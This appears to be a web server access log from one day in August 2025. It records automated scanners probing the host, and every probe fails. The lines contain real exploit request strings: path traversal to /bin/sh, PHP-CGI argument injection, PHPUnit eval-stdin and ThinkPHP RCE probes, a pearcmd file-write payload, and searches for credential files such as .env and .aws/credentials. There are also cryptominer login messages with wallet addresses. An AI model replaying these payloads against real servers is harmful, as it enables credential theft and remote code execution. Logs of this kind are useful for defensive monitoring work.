+104.234.115.237 - - [03/Aug/2025 06:47:13] "GET / HTTP/1.1" 200 -
+147.185.132.69 - - [03/Aug/2025 07:06:09] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03§XEQºóç\x100\x14âëfwê\x190Aq>û~î\xadÖç\x92\x89\x19G8>')
+147.185.132.69 - - [03/Aug/2025 07:06:09] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03§XEQºóç\x100\x14âëfwê\x190Aq>û~î­Öç\x92\x89\x19G8> êaÏrgö¡Ó|\x9dh\x01!Ó¥-«\x8d[0m" 400 -
+147.185.132.69 - - [03/Aug/2025 07:06:09] code 400, message Bad request version ('À(À$À\x14À')
+147.185.132.69 - - [03/Aug/2025 07:06:09] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x7f}(Ín^¥\x1b¢ÆÅæ[}¹\x0cY\x83h§qãY#dëÚ\x96SÕ\x0c\x16\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+149.50.96.5 - - [03/Aug/2025 07:06:18] "[33mGET /page/style/index.css HTTP/1.1[0m" 404 -
+103.20.102.84 - - [03/Aug/2025 07:06:36] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+185.242.226.99 - - [03/Aug/2025 07:18:01] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03ÕPuYã\x19O\x06s\x8eÏ\x11^r[Qî=È\x955\x95a-*Ô°\x05u\x11\x97f\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+185.242.226.99 - - [03/Aug/2025 07:18:01] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03ÕPuYã\x19O\x06s\x8eÏ\x11^r[Qî=È\x955\x95a-*Ô°\x05u\x11\x97f\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+45.135.194.136 - - [03/Aug/2025 07:19:50] "GET / HTTP/1.1" 200 -
+199.45.155.78 - - [03/Aug/2025 07:37:56] "GET / HTTP/1.1" 200 -
+199.45.155.78 - - [03/Aug/2025 07:37:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+199.45.155.78 - - [03/Aug/2025 07:37:57] code 505, message Invalid HTTP version (2.0)
+199.45.155.78 - - [03/Aug/2025 07:37:57] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+199.45.155.78 - - [03/Aug/2025 07:38:02] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+199.45.155.78 - - [03/Aug/2025 07:38:03] code 505, message Invalid HTTP version (2.0)
+199.45.155.78 - - [03/Aug/2025 07:38:03] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+199.45.155.78 - - [03/Aug/2025 07:38:08] code 400, message Bad request version ('À\x14À')
+199.45.155.78 - - [03/Aug/2025 07:38:08] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¸»9BH\x05\x09AsÀX\x87¼+\x8e\x8bªD(-ýQ\x141\x96ü6¡\x1b5^\x11 mâê¿Ëor­%[[\x91%\x86Âé\x80B1\x80\x80¾âÖ¨Eîþ\x1bcÆI\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+199.45.155.78 - - [03/Aug/2025 07:38:09] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+193.46.255.153 - - [03/Aug/2025 07:41:49] "GET / HTTP/1.1" 200 -
+78.153.140.151 - - [03/Aug/2025 08:09:19] "[33mGET /.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:19] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03Ã72B#?\x7fwÕaÔ\x1bJ:\x8e\x06%üÝu')
+78.153.140.151 - - [03/Aug/2025 08:09:19] "[31m[1m\x16\x03\x01\x00¬\x01\x00\x00¨\x03\x03Ã72B#?\x7fwÕaÔ\x1bJ:\x8e\x06%üÝu\x1d!È\x82©Pô',ÈäC\x00\x008À,À[0m" 400 -
+78.153.140.151 - - [03/Aug/2025 08:09:19] "[33mGET /api/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:19] "[33mGET /backend/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:19] "[33mGET /admin/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:21] "[33mGET /.env.example HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:21] "[33mGET /app_dev.php/_profiler/phpinfo HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:21] "GET /?phpinfo=-1 HTTP/1.1" 200 -
+78.153.140.151 - - [03/Aug/2025 08:09:21] "[33mGET /docs/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:21] "[33mGET /old/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:22] "[33mGET /.env.local HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:22] "[33mGET /cms/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:22] "[33mGET /config.js HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:22] "[33mGET /new/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:23] "[33mGET /frontend/web/debug/default/view HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:23] "[33mGET /_static/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:23] "[33mGET /download/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:23] "[33mGET /saas/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:23] "[33mGET /.env.json HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:24] "[33mGET /infos/ HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:24] "[33mGET /apps/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:24] "[33mGET /templates/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:25] "[33mGET /system/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:25] "[33mGET /stag/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:26] "[33mGET /public_html/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:26] "[33mGET /.env.development HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:27] "[33mGET /portal/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:27] "[33mGET /project/.env HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:27] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:27] "[33mGET /app/config/parameters.yml HTTP/1.1[0m" 404 -
+78.153.140.151 - - [03/Aug/2025 08:09:28] "[33mGET /exapi/.env HTTP/1.1[0m" 404 -
+144.172.110.50 - - [03/Aug/2025 08:15:26] "GET / HTTP/1.0" 200 -
+170.39.218.2 - - [03/Aug/2025 08:27:26] code 400, message Bad request version ('À\x13À')
+170.39.218.2 - - [03/Aug/2025 08:27:26] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03r!Lª\x98AÅo7r3ëß;D,6éÁñ\x7fÕG`R\x9eû»\x81}©Á Ì6\x87\x9d\x0d|%Þ\x1bþ7S¿\x037¤wD13á\x92R\x0b²øÌËÿF9ô\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+170.39.218.2 - - [03/Aug/2025 08:27:26] "GET / HTTP/1.1" 200 -
+170.39.218.2 - - [03/Aug/2025 08:27:27] "GET / HTTP/1.1" 200 -
+170.39.218.2 - - [03/Aug/2025 08:27:27] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+35.203.210.158 - - [03/Aug/2025 08:29:20] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [03/Aug/2025 08:33:54] "GET / HTTP/1.1" 200 -
+157.245.226.231 - - [03/Aug/2025 08:44:16] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x830@#æî5.\x12\x17\x01d\x1b\x07ýSuèúe:é*:Ór~÷ÌÀ^Ì\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+157.245.226.231 - - [03/Aug/2025 08:44:16] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x830@#æî5.\x12\x17\x01d\x1b\x07ýSuèúe:é*:Ór~÷ÌÀ^Ì\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+157.245.226.231 - - [03/Aug/2025 08:44:16] code 400, message Bad request version ('À\x14À')
+157.245.226.231 - - [03/Aug/2025 08:44:16] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ü\x0cg*øÝÕ\x15\x89ÅúÈ\x91)?Ö;ÏBË\x0b{¨âBÈ\x1dÀ\x17Ð\x8aÚ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+157.245.226.231 - - [03/Aug/2025 08:44:17] "GET / HTTP/1.1" 200 -
+157.245.226.231 - - [03/Aug/2025 08:44:17] "[33mGET /form.html HTTP/1.1[0m" 404 -
+157.245.226.231 - - [03/Aug/2025 08:44:17] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+157.245.226.231 - - [03/Aug/2025 08:44:18] "[33mGET /t4 HTTP/1.1[0m" 404 -
+157.245.226.231 - - [03/Aug/2025 08:44:18] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+157.245.226.231 - - [03/Aug/2025 08:44:18] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+157.245.226.231 - - [03/Aug/2025 08:44:19] "[33mGET /1.php HTTP/1.1[0m" 404 -
+157.245.226.231 - - [03/Aug/2025 08:44:19] "[33mGET /systembc/password.php HTTP/1.1[0m" 404 -
+157.245.226.231 - - [03/Aug/2025 08:44:19] "[33mGET /password.php HTTP/1.1[0m" 404 -
+204.76.203.219 - - [03/Aug/2025 09:08:38] "GET / HTTP/1.1" 200 -
+167.94.138.40 - - [03/Aug/2025 09:30:06] "GET / HTTP/1.1" 200 -
+167.94.138.40 - - [03/Aug/2025 09:30:08] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.138.40 - - [03/Aug/2025 09:30:14] code 505, message Invalid HTTP version (2.0)
+167.94.138.40 - - [03/Aug/2025 09:30:14] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.138.40 - - [03/Aug/2025 09:30:25] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.138.40 - - [03/Aug/2025 09:30:31] code 505, message Invalid HTTP version (2.0)
+167.94.138.40 - - [03/Aug/2025 09:30:31] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.138.40 - - [03/Aug/2025 09:30:42] code 400, message Bad request version ('À\x14À')
+167.94.138.40 - - [03/Aug/2025 09:30:42] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03S´þ­¢ ¦Î\x94R÷ÙeZkH) \x8e¿@ï\x8a¡Æ}NH\x85ùRB $\x8d\x15ÆÑLº×\x1fègð¼,û\x93)\x99½;v\x04\x97Üg#ä\x1f¦FuZ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+167.94.138.40 - - [03/Aug/2025 09:30:44] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+149.50.96.5 - - [03/Aug/2025 09:30:59] "[33mGET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1[0m" 404 -
+93.174.93.12 - - [03/Aug/2025 09:33:21] "GET / HTTP/1.0" 200 -
+91.224.92.17 - - [03/Aug/2025 09:37:19] "GET / HTTP/1.1" 200 -
+190.60.4.138 - - [03/Aug/2025 09:54:20] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01¨\x01\x00\x01¤\x03\x03~sPù¼WY\x92ý\x8e|\x98Z:U¬Øè|n§\x81±\x80÷»w³m\x1b\x91K')
+190.60.4.138 - - [03/Aug/2025 09:54:20] "[31m[1m\x16\x03\x01\x01¨\x01\x00\x01¤\x03\x03~sPù¼WY\x92ý\x8e|\x98Z:U¬Øè|n§\x81±\x80÷»w³m\x1b\x91K æw\x11\x18£-\x03~9;ú\x99J¤²G\x9d4ÅzFvé_R^e£âmwí\x00Æ\x13\x01\x13\x02\x13\x03\x13\x04\x13\x05À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À­À£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À[0m" 400 -
+3.149.59.26 - - [03/Aug/2025 09:55:54] "GET / HTTP/1.1" 200 -
+3.149.59.26 - - [03/Aug/2025 09:58:28] code 400, message Bad request version ('À\x14À')
+3.149.59.26 - - [03/Aug/2025 09:58:28] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¤]Åsa\x0f\x9e\x9a-ÒÒ\x18é¼XNfaxñåOé¯Mk\x12Ë\x93\x0bÙÈ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+3.149.59.26 - - [03/Aug/2025 10:00:23] code 400, message Bad request syntax ('SSH-2.0-Go')
+3.149.59.26 - - [03/Aug/2025 10:00:23] "[31m[1mSSH-2.0-Go[0m" 400 -
+3.149.59.26 - - [03/Aug/2025 10:00:59] code 400, message Bad request version ('À\x14À')
+3.149.59.26 - - [03/Aug/2025 10:00:59] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03|l4\x92\x9aöÖ \x0bm\x8fÙíX¡Ð9\x10£\x08nL\x93Ìò\x07jBXÔô­\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+196.251.86.50 - - [03/Aug/2025 10:04:57] "GET / HTTP/1.0" 200 -
+149.50.96.114 - - [03/Aug/2025 10:28:06] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [03/Aug/2025 10:43:04] "GET / HTTP/1.1" 200 -
+161.35.239.3 - - [03/Aug/2025 11:00:57] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:00:57] "[33mPOST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:00:59] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:00:59] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:00] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:00] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:01] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:02] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:02] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:03] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:14] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:15] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:26] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:26] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:27] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:32] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:33] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:33] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:36] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:36] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:36] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:37] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:37] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:37] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:39] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:39] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:39] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:40] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:42] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:46] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:46] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:46] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:48] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:48] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:49] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:49] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:49] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:50] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:51] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:52] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:52] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:57] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:57] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:57] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1[0m" 404 -
+161.35.239.3 - - [03/Aug/2025 11:01:58] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+91.224.92.17 - - [03/Aug/2025 11:08:02] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [03/Aug/2025 11:41:32] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [03/Aug/2025 11:41:32] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+134.209.156.177 - - [03/Aug/2025 11:46:19] "[33mGET /.env HTTP/1.1[0m" 404 -
+134.209.156.177 - - [03/Aug/2025 11:46:20] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+196.251.114.43 - - [03/Aug/2025 11:53:42] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+193.46.255.153 - - [03/Aug/2025 11:55:57] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [03/Aug/2025 11:56:46] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+204.76.203.219 - - [03/Aug/2025 12:15:22] "GET / HTTP/1.1" 200 -
+112.46.212.62 - - [03/Aug/2025 12:21:15] "GET / HTTP/1.1" 200 -
+64.62.156.142 - - [03/Aug/2025 12:33:55] "GET / HTTP/1.1" 200 -
+64.62.156.142 - - [03/Aug/2025 12:36:36] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+64.62.156.142 - - [03/Aug/2025 12:37:19] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+149.50.96.5 - - [03/Aug/2025 13:19:22] "[33mGET /login.asp HTTP/1.1[0m" 404 -
+146.70.116.115 - - [03/Aug/2025 13:39:34] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+195.170.172.128 - - [03/Aug/2025 13:41:17] code 400, message Bad request version ("\x92ð\x8f;!úÑ#ÂC\x10Cì23A¤¬\x81²îÖ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+195.170.172.128 - - [03/Aug/2025 13:41:17] "[31m[1m\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x031L¶7½\x0f5\x19Wþ¿\x8aµ¯Mt\x0b\x09\x8a&T\x1dG¹Óì­¿-é\x8d\x8d ×\x9an\x1bhK<®± \x92ð\x8f;!úÑ#ÂC\x10Cì23A¤¬\x81²îÖ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+195.170.172.128 - - [03/Aug/2025 13:41:19] code 400, message Bad request version ('["cpuminer/2.5.1"]}')
+195.170.172.128 - - [03/Aug/2025 13:41:19] "[31m[1m{"id": 1, "method": "mining.subscribe", "params": ["cpuminer/2.5.1"]}[0m" 400 -
+195.170.172.128 - - [03/Aug/2025 13:41:21] code 400, message Bad request version ('"EthereumStratum/1.0.0"]}')
+195.170.172.128 - - [03/Aug/2025 13:41:21] "[31m[1m{"id": 1, "method": "mining.subscribe", "params": ["MinerName/1.0.0", "EthereumStratum/1.0.0"]}[0m" 400 -
+195.170.172.128 - - [03/Aug/2025 13:41:22] code 400, message Bad request syntax ('{"id":1,"method":"eth_submitLogin","worker":"igwrcvap","params":["0x66554662f451a972b4080ca03ba1cb608ab16011","x"],"jsonrpc":"2.0"}')
+195.170.172.128 - - [03/Aug/2025 13:41:22] "[31m[1m{"id":1,"method":"eth_submitLogin","worker":"igwrcvap","params":["0x66554662f451a972b4080ca03ba1cb608ab16011","x"],"jsonrpc":"2.0"}[0m" 400 -
+195.170.172.128 - - [03/Aug/2025 13:41:24] code 400, message Bad request version ('msvc/2019","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","astrobwt"]}}')
+195.170.172.128 - - [03/Aug/2025 13:41:24] "[31m[1m{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"42RUp4gegSqhcJjtQrUfMQh15pJzwPLpyHyFmUct4AJuMPcmk3K54od1Z66wdToVr1NixVKfWW5T1FBkCEXehAt2Nwq62YA","pass":"x","agent":"XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","cn/ccx","cn-lite/1","cn-heavy/0","cn-heavy/tube","cn-heavy/xhv","cn-pico","cn-pico/tlo","cn/upx2","rx/0","rx/wow","rx/arq","rx/graft","rx/sfx","rx/keva","argon2/chukwa","argon2/chukwav2","argon2/ninja","astrobwt"]}}[0m" 400 -
+195.170.172.128 - - [03/Aug/2025 13:41:25] "GET / HTTP/1.1" 200 -
+195.170.172.128 - - [03/Aug/2025 13:41:28] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+195.170.172.128 - - [03/Aug/2025 13:41:30] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+195.170.172.128 - - [03/Aug/2025 13:41:32] "[33mGET /WuEL HTTP/1.1[0m" 404 -
+195.170.172.128 - - [03/Aug/2025 13:41:33] "[33mGET stager64 HTTP/1.1[0m" 404 -
+195.170.172.128 - - [03/Aug/2025 13:41:35] "[33mGET /a HTTP/1.1[0m" 404 -
+195.170.172.128 - - [03/Aug/2025 13:41:36] "[33mGET /download/file.ext HTTP/1.1[0m" 404 -
+195.170.172.128 - - [03/Aug/2025 13:41:37] "[33mGET /SiteLoader HTTP/1.1[0m" 404 -
+195.170.172.128 - - [03/Aug/2025 13:41:39] "[33mGET /mPlayer HTTP/1.1[0m" 404 -
+195.170.172.128 - - [03/Aug/2025 13:41:40] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+198.55.98.76 - - [03/Aug/2025 13:48:38] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+91.224.92.17 - - [03/Aug/2025 14:14:57] "GET / HTTP/1.1" 200 -
+20.98.153.37 - - [03/Aug/2025 14:19:59] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+149.50.96.114 - - [03/Aug/2025 14:27:43] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [03/Aug/2025 14:35:13] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [03/Aug/2025 14:48:49] code 400, message Bad request version ('}')
+141.98.11.57 - - [03/Aug/2025 14:48:49] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+196.251.69.145 - - [03/Aug/2025 14:56:42] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [03/Aug/2025 15:10:29] "GET / HTTP/1.1" 200 -
+190.111.180.37 - - [03/Aug/2025 15:39:28] "GET / HTTP/1.1" 200 -
